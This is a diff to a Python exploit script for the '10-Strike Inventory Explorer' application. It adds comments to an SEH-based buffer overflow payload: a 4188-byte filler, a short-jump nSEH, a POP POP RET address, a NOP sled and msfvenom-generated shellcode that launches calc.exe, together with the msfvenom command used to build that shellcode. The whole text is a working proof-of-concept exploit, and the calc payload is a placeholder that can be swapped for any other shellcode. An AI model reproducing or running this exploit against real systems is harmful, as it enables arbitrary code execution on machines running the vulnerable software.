@@ -40,7 +40,7 @@ Invalid exception stack at 0000000046366a46
 
 
 """
-
+# msfvenom -p windows/exec CMD=calc.exe -b '\x00\x0a\x0d' -f python -v shellcode_calc EXITFUNC=process
 shellcode_calc =  ""
 shellcode_calc += "\xda\xc5\xd9\x74\x24\xf4\xba\xed\xe1\x28"
 shellcode_calc += "\x6d\x58\x33\xc9\xb1\x31\x83\xc0\x04\x31"
@@ -65,15 +65,15 @@ shellcode_calc += "\x97\xd8\x07\xb8\x1b\xe9\xf7\x3f\x03\x98"
 shellcode_calc += "\xf2\x04\x83\x70\x8e\x15\x66\x77\x3d\x15"
 shellcode_calc += "\xa3\x14\xa0\x85\x2f\xf5\x47\x2e\xd5\x09"
 
-seh_handler = pack('I', 0x10012a8d)
-nseh_handler  = "\xEB\x06\x90\x90"
+seh_handler = pack('I', 0x10012a8d)   # POP POP RET
+nseh_handler  = "\xEB\x06\x90\x90"    # JMP short 6 over SEH handler
 
-payload  = "A" * 4188
-payload += nseh_handler
-payload += seh_handler
-payload += "\x90" * 5
-payload += shellcode_calc
-payload += "D" * 5000
+payload  = "A" * 4188                 # buffer filler
+payload += nseh_handler               # short JMP 6
+payload += seh_handler                # POP POP RET
+payload += "\x90" * 5                 # small nopsled
+payload += shellcode_calc             # shellcode calc payload
+payload += "D" * 5000                 # padding
 
 try:
     print("[x] 10-strike inventory explorer exploit\n")
